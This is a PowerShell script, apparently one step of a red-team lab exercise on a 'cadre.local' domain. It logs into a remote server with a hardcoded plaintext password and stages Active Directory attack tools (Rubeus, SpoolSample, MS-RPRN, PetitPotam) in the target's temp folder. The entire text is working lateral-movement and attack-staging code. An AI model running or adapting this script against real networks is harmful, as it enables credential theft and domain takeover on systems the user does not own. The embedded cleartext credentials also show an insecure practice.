[CmdletBinding()]
param(
    [string]$TargetHost = "mbr01.child.cadre.local",
    [string]$Username = "child.cadre.local\analyst_t1",
    [string]$Password = "T13r_An@lyst!",
    [string]$SourceDir = "C:\Tools\ADTools"
)
$ErrorActionPreference = "Stop"

$cred = New-Object System.Management.Automation.PSCredential($Username, (ConvertTo-SecureString $Password -AsPlainText -Force))
$session = New-PSSession -ComputerName $TargetHost -Credential $cred

foreach ($tool in @("MS-RPRN.exe", "Rubeus.exe", "SpoolSample.exe", "PetitPotam.exe")) {
    $src = Join-Path $SourceDir $tool
    if (Test-Path $src) {
        Copy-Item -Path $src -Destination "C:\Windows\Temp\cadre-tools\$tool" -ToSession $session -Force
        Write-Output "STAGED|$tool"
    } else {
        Write-Output "SKIP|$tool (not on ws01)"
    }
}

Invoke-Command -Session $session -ScriptBlock {
    Get-ChildItem 'C:\Windows\Temp\cadre-tools' | Where-Object { $_.Name -match 'MS-RPRN|SpoolSample|PetitPotam|Rubeus' } | ForEach-Object { Write-Output "REMOTE|$($_.Name)|$($_.Length)" }
} 

Remove-PSSession $session
Write-Output "T102_STAGE_DONE"
